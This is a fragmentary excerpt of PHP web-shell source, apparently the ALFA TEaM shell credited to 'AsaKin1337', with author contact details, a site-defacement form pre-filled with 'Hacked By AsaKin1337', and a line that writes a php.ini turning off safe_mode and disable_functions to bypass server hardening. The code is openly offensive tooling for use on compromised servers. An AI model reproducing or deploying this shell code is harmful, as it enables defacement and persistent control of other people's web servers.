...
<font color='#00A220'>Shell Coded By AsaKin1337 (ALFA TEaM)</font><br>
<font color='#00A220'>Contact : AsaKin1337@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @AsaKinWebshell</font><br>
...
<textarea name=index rows='19' cols='103'><title>Hacked By AsaKin1337</title><b>Hacked By AsaKin1337</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By AsaKin1337</title><b>Hacked By AsaKin1337</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By AsaKin1337(ALFA TEaM)");
